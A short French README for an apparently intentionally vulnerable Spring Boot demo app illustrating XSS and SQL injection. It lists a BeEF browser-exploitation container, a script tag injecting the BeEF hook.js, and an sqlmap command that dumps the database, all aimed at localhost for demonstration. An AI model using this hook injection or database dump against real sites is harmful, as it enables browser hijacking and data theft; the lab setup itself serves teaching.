# Projet démo Quicky XSS-SQLi

Projet de démonstration de quelques vulnérabilités XSS & SQLi

## Build

Le projet est buildé avec Maven.

    mvn clean install

## Execution

Pour executer l'application il vous faudra obligatoirement une base de donnée MYSQL.

    docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=quicky mysql
    mvn springboot:run
    
# SQLi
    
 Des exemples d'injections SQL sont disponibles dans src/main/resources/sqli.sql 
    
# Beef XSS

    docker run -p 3000:3000 -d janes/beef
    
 Dashboard:
 
    http://localhost:3000/ui/panel
    
 Hook :
 
    http://localhost:3000/hook.js
    <script src="http://localhost:3000/hook.js"></script>


# sqlmap

    sqlmap -u 'http://localhost:8081/sqli/blind?input=patrick' --dump
